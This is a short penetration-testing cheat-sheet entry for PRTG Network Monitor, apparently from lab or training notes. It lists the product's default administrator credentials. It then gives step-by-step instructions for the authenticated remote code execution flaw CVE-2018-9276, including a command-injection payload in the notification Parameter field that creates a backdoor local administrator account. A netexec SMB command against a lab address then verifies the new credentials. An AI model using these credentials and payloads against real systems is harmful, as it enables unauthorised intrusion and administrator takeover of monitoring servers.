
## Default Credentials:

`prtgadmin:prtgadmin`.

---
## PRTG Network Monitor Auth RCE [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276)


- **Description:** When creating a new notification, the Parameter field is passed directly into a PowerShell script without any type of input sanitization
- **Steps to reproduce:**
    1. `Login` - `Setup` - `Account Settings menu` - `Notifications` - `Add new notification`
    2. Give the notification a name
    3. Scroll down and tick the box next to `EXECUTE PROGRAM`
    4. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down.
    5. In the `parameter field`, enter a command.
    6. Example - add a new local admin user:
    7. `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`
    8. After clicking `Save`, we will be redirected to the Notifications page and see our new notification named pwn in the list.
    9. Click on `Test` or `Run` to execute the notification and run the command

```sh
sudo nxc smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
### Testing out
```

---